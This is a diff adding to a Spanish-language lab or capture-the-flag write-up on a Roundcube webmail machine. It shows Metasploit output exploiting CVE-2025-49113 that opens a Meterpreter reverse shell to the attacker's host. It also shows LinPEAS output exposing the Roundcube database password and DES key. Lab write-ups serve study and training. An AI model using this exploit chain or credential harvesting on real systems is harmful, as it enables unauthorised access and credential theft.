@@ -142,3 +142,24 @@ msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
 [*] Sending stage (3045380 bytes) to 10.10.11.77
 [*] Meterpreter session 1 opened (10.10.14.123:4444 -> 10.10.11.77:54704) at 2025-07-16 09:30:37 -0400
 ```
+Linepeas ha descubierto esto
+```bash
+╔══════════╣ Analyzing Roundcube Files (limit 70)
+drwx------ 1 mysql mysql 4096 Jul 16 14:50 /var/lib/mysql/roundcube                                                 
+find: '/var/lib/mysql/roundcube': Permission denied
+
+drwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 /var/www/html/roundcube
+-rw-r--r-- 1 root root 3024 Jun  6 18:55 /var/www/html/roundcube/config/config.inc.php
+$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
+$config['imap_host'] = 'localhost:143';
+$config['smtp_host'] = 'localhost:587';
+$config['smtp_user'] = '%u';
+$config['smtp_pass'] = '%p';
+$config['support_url'] = '';
+$config['product_name'] = 'Roundcube Webmail';
+$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
+$config['plugins'] = [
+$config['skin'] = 'elastic';
+$config['default_host'] = 'localhost';
+$config['smtp_server'] = 'localhost';
+```
